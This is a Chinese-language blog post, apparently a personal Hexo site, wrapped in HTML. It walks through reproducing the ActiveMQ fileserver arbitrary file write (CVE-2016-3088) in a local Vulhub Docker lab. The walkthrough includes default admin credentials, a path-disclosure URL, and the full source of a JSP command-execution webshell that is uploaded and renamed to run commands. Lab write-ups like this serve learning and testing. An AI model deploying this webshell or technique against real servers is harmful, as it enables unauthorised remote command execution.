@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="前言：学习完Rust的Vector，想着复现一下Vulhub里面的漏洞。然后就踩到了一个坑了。= =简直MMP，原本是想着写CVE-2015-5254的复现的。可复现方法不能用了。所以emmmm…. 正文：首先我们要搭建Vulhub的环境： Vulhub漏靶场搭建方法：  vulhub官网：http://vulhub.org/#/docs/download-vulhub/ 1.安装docker，w">
+<meta name="keywords" content="Writing">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ActiveMQ任意文件写入漏洞（CVE-2016-3088）">
+<meta property="og:url" content="http://422926799.github.io/posts/55a9538c.html">
+<meta property="og:site_name" content="九世的博客">
+<meta property="og:description" content="前言：学习完Rust的Vector，想着复现一下Vulhub里面的漏洞。然后就踩到了一个坑了。= =简直MMP，原本是想着写CVE-2015-5254的复现的。可复现方法不能用了。所以emmmm…. 正文：首先我们要搭建Vulhub的环境： Vulhub漏靶场搭建方法：  vulhub官网：http://vulhub.org/#/docs/download-vulhub/ 1.安装docker，w">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=886494489,586744998&fm=27&gp=0.jpg">
+<meta property="og:image" content="https://i.imgur.com/VZ5imMu.png">
+<meta property="og:image" content="https://i.imgur.com/uoF1A1z.png">
+<meta property="og:image" content="https://i.imgur.com/LpIcgNx.png">
+<meta property="og:image" content="https://i.imgur.com/MyFt8se.png">
+<meta property="og:image" content="https://i.imgur.com/dSa5cgB.png">
+<meta property="og:image" content="https://i.imgur.com/YdINGV6.png">
+<meta property="og:image" content="https://i.imgur.com/asEAY27.png">
+<meta property="og:image" content="https://i.imgur.com/AI0RAO3.png">
+<meta property="og:updated_time" content="2019-04-19T12:36:16.242Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ActiveMQ任意文件写入漏洞（CVE-2016-3088）">
+<meta name="twitter:description" content="前言：学习完Rust的Vector，想着复现一下Vulhub里面的漏洞。然后就踩到了一个坑了。= =简直MMP，原本是想着写CVE-2015-5254的复现的。可复现方法不能用了。所以emmmm…. 正文：首先我们要搭建Vulhub的环境： Vulhub漏靶场搭建方法：  vulhub官网：http://vulhub.org/#/docs/download-vulhub/ 1.安装docker，w">
+<meta name="twitter:image" content="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=886494489,586744998&fm=27&gp=0.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>ActiveMQ任意文件写入漏洞（CVE-2016-3088）</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/Search">搜索</a></li>
+         
+          <li><a href="/Href">友链</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/posts/8a2431fe.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/posts/5358472d.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://422926799.github.io/posts/55a9538c.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://422926799.github.io/posts/55a9538c.html&text=ActiveMQ任意文件写入漏洞（CVE-2016-3088）"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://422926799.github.io/posts/55a9538c.html&title=ActiveMQ任意文件写入漏洞（CVE-2016-3088）"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://422926799.github.io/posts/55a9538c.html&is_video=false&description=ActiveMQ任意文件写入漏洞（CVE-2016-3088）"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ActiveMQ任意文件写入漏洞（CVE-2016-3088）&body=Check out this article: http://422926799.github.io/posts/55a9538c.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://422926799.github.io/posts/55a9538c.html&title=ActiveMQ任意文件写入漏洞（CVE-2016-3088）"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://422926799.github.io/posts/55a9538c.html&title=ActiveMQ任意文件写入漏洞（CVE-2016-3088）"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://422926799.github.io/posts/55a9538c.html&title=ActiveMQ任意文件写入漏洞（CVE-2016-3088）"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://422926799.github.io/posts/55a9538c.html&title=ActiveMQ任意文件写入漏洞（CVE-2016-3088）"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://422926799.github.io/posts/55a9538c.html&name=ActiveMQ任意文件写入漏洞（CVE-2016-3088）&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言："><span class="toc-number">1.</span> <span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#正文："><span class="toc-number">2.</span> <span class="toc-text">正文：</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        ActiveMQ任意文件写入漏洞（CVE-2016-3088）
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">九世的博客</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-07-24T22:43:17.000Z" itemprop="datePublished">2018-07-25</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Writing/">Writing</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>学习完Rust的Vector，想着复现一下Vulhub里面的漏洞。然后就踩到了一个坑了。= =简直MMP，原本是想着写CVE-2015-5254的复现的。可复现方法不能用了。所以emmmm….<br><img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=886494489,586744998&amp;fm=27&amp;gp=0.jpg" alt=""></p>
+<h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><p>首先我们要搭建Vulhub的环境：</p>
+<pre><code>Vulhub漏靶场搭建方法：
+
+vulhub官网：http://vulhub.org/#/docs/download-vulhub/
+1.安装docker，windows自己去官网下。Linux执行：sudo apt-get install docker.io
+2.安装python和pip:sudo apt-get install python和suao apt-get install python-pip
+3.安装docker-compose:pip install docker-compose
+4.下载Vulhub：git clone https://github.com/vulhub/vulhub.git
+
+安装好之后进入对应的漏洞文件执行：docker-compose up -d
+如果出现：Couldn&apos;t connect to Docker daemon at http+xxx的问题有三个解决的方法：
+1.将当前的用户加入dokcer用户组 sudo usermod -aG docker &lt;Username&gt;
+2.在使用docker-compose附加上sudo sudo docker-compose up -d
+3.设置DOCKER_HOST这一个环境变量 export DOCKER_HOST=tcp://loaclhost:4243 设置完成后重新启动docker
+</code></pre><p>漏洞介绍：</p>
+<pre><code>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。
+
+fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：
+
+其使用率并不高
+文件操作容易出现漏洞
+所以，ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。
+</code></pre><p>在测试过程中，可以关注ActiveMQ的版本，避免走弯路。</p>
+<p>这里我的是CVE-2016-3088,所以我们要进入对应的目录：</p>
+<pre><code>cd /vulhub/activemq/CVE-2016-3088 
+</code></pre><p><img src="https://i.imgur.com/VZ5imMu.png" alt=""></p>
+<pre><code>然后执行docker-compose -build 下载漏洞环境
+然后在执行docker-compose up -d 启动
+</code></pre><p>之后我们打开浏览器访问：</p>
+<pre><code>http://127.0.0.1:8161
+</code></pre><p>我们可以看到如下图所示：</p>
+<p><img src="https://i.imgur.com/uoF1A1z.png" alt=""></p>
+<p>这个任意文件写入漏洞得要先知道WEB路径。所以我们得登陆后台<br>默认用户名和密码是：admin/admin，登陆进去后我们要访问</p>
+<pre><code>http://your-ip:8161/admin/test/systemProperties.jsp
+</code></pre><p>查看ActiveMQ的绝对路径</p>
+<p><img src="https://i.imgur.com/LpIcgNx.png" alt=""></p>
+<p>绝对路径为：</p>
+<pre><code>/opt/activemq
+</code></pre><p>知道绝对路径之后，我们要进行文件上传。<br><img src="https://i.imgur.com/MyFt8se.png" alt=""></p>
+<p>注：这里的shell2.txt为shell代码<br>shell代码如下：</p>
+<pre><code>&lt;%@ page import=&quot;java.util.*,java.io.*&quot;%&gt; &lt;% %&gt; 
+&lt;HTML&gt;&lt;BODY&gt; &lt;FORM METHOD=&quot;GET&quot; NAME=&quot;comments&quot; ACTION=&quot;&quot;&gt;
+&lt;INPUT TYPE=&quot;text&quot; NAME=&quot;comment&quot;&gt; 
+&lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt; 
+&lt;/FORM&gt; &lt;pre&gt; 
+&lt;%
+ if ( request.getParameter( &quot;comment&quot; ) != null )
+ {
+     out.println( &quot;Command: &quot; + request.getParameter( &quot;comment&quot; ) + &quot;&lt;BR&gt;&quot; );
+     Process p        = Runtime.getRuntime().exec( request.getParameter( &quot;comment&quot; ) );
+     OutputStream os    = p.getOutputStream();
+     InputStream in        = p.getInputStream();
+     DataInputStream dis    = new DataInputStream( in );
+     String disr        = dis.readLine();
+     while ( disr != null )
+     {
+         out.println( disr ); disr = dis.readLine();
+     }
+ }
+ %&gt;
+ &lt;/pre&gt; 
+ &lt;/BODY&gt;&lt;/HTML&gt;
+</code></pre><p>代码来自：<a href="https://github.com/JoyChou93/webshell/blob/master/jsp/cmd.jsp" title="JSP shell" target="_blank" rel="noopener">https://github.com/JoyChou93/webshell/blob/master/jsp/cmd.jsp</a></p>
+<p>上传：<br><img src="https://i.imgur.com/dSa5cgB.png" alt=""></p>
+<p>HTTP状态码为204，即为上传成功</p>
+<p>然后听过MOVE进行改名为jsp<br><img src="https://i.imgur.com/YdINGV6.png" alt=""></p>
+<p>然后我们访问<a href="http://127.0.0.1:8161/api,就可以看到我们上传的shell文件" target="_blank" rel="noopener">http://127.0.0.1:8161/api,就可以看到我们上传的shell文件</a></p>
+<p><img src="https://i.imgur.com/asEAY27.png" alt=""></p>
+<p>执行命令如下：<br><img src="https://i.imgur.com/AI0RAO3.png" alt=""></p>
+<p>ActiveMQ更多漏洞：<a href="http://www.freebuf.com/column/161188.html" title="更多漏洞" target="_blank" rel="noopener">http://www.freebuf.com/column/161188.html</a></p>
+<p>转载请声明：来之422926799.github.io</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/Search">搜索</a></li>
+         
+          <li><a href="/Href">友链</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言："><span class="toc-number">1.</span> <span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#正文："><span class="toc-number">2.</span> <span class="toc-text">正文：</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://422926799.github.io/posts/55a9538c.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://422926799.github.io/posts/55a9538c.html&text=ActiveMQ任意文件写入漏洞（CVE-2016-3088）"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://422926799.github.io/posts/55a9538c.html&title=ActiveMQ任意文件写入漏洞（CVE-2016-3088）"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://422926799.github.io/posts/55a9538c.html&is_video=false&description=ActiveMQ任意文件写入漏洞（CVE-2016-3088）"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ActiveMQ任意文件写入漏洞（CVE-2016-3088）&body=Check out this article: http://422926799.github.io/posts/55a9538c.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://422926799.github.io/posts/55a9538c.html&title=ActiveMQ任意文件写入漏洞（CVE-2016-3088）"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://422926799.github.io/posts/55a9538c.html&title=ActiveMQ任意文件写入漏洞（CVE-2016-3088）"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://422926799.github.io/posts/55a9538c.html&title=ActiveMQ任意文件写入漏洞（CVE-2016-3088）"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://422926799.github.io/posts/55a9538c.html&title=ActiveMQ任意文件写入漏洞（CVE-2016-3088）"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://422926799.github.io/posts/55a9538c.html&name=ActiveMQ任意文件写入漏洞（CVE-2016-3088）&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 九世
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/Search">搜索</a></li>
+         
+          <li><a href="/Href">友链</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
